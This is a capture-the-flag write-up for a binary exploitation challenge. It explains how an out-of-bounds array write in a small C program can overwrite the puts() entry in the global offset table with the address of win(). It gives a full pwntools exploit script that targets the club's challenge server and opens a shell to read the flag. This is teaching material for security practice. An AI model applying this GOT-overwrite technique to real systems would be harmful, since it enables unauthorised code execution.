# Reconnaissance
## C Review
Immediately an interesting part of this program is that an array `target` is declared in the global scope. Then the `main()` function takes user input to define an integer variable `idx` and a long variable `value`. The program accesses the `target` array at index `idx` and writes `value` there. This allows us to write a long to an arbitrary memory address, which is obviously the vulnerability at play here. Next in the program, `puts()` is called to say "bye" and then the process ends.

Initially, I thought that the method for this would be to somehow find the location of these variables on the stack and overwrite the return address of `main()`, but trying at this for a bit was fruitless. Then, by looking at some work from others I learned that you can access the global offset table and change the addresses of functions! So, the objective will be to use target to overwrite the address of `puts()` in the global offset table and replace it with the address for `win()`

# Script
To start testing, we are going to run our script on the ELF we were given for the challenge. We can load it like this:
```{python}
from pwn import *

EXE = ELF("./challenge/chall_7")

context.binary = EXE
context.log_level = "DEBUG"
target_address = EXE.symbols['target']
win_address = EXE.symbols['win']
puts_got = EXE.got['puts']

def conn(useExe=False):
	if useExe:
		# r = gdb.debug(EXE.path, "\n".join(breakpoints))
		r = process([EXE.path])
	else:
		r = remote('pwn.osucyber.club',13378)
	return r

io = conn(False)
```
Here we are doing a couple of things. We are importing the `pwn` library to use as our primary tool for both working on the local file and the challenge server. Then, we use `pwn`'s `ELF` module to put the executable into a variable `EXE`. Then we set up a few things for `pwn`, most importantly `context.log_level = "DEBUG"` because this will give us verbose information about what we send and recieve with `pwn`.

The `conn()` function being set up here simply allows us to minimally change the program to run remotely when we are finished with testing. Calling this function with `True` as a parameter connects to the local installation of the server executable, whose path is written in the definition of the `EXE` variable. Then once our testing is completed, we can call `conn(False)` to make a connection to the remote server.

Next, we connect and craft and send our payload:
```{python}
io = conn(False)

# Create a payload for idx, cakculated by finding the difference in 
# the address of `target` and the entry for `puts` in the global offset
# table in bytes, then dividing that by 8 because `target` is an array
# of longs, which are 8 bytes each.
payload = str((puts_got - target_address)//8).encode()
payload += b'\n'
io.send(payload)

# Create a payload for value
payload = str(win_address).encode()
payload += b'\n'
io.send(payload)
io.interactive()

io.close()
```

If this spawns a terminal, then our code worked! We can run it again on the server then call `ls` and `cat flag.txt` in the interactive shell!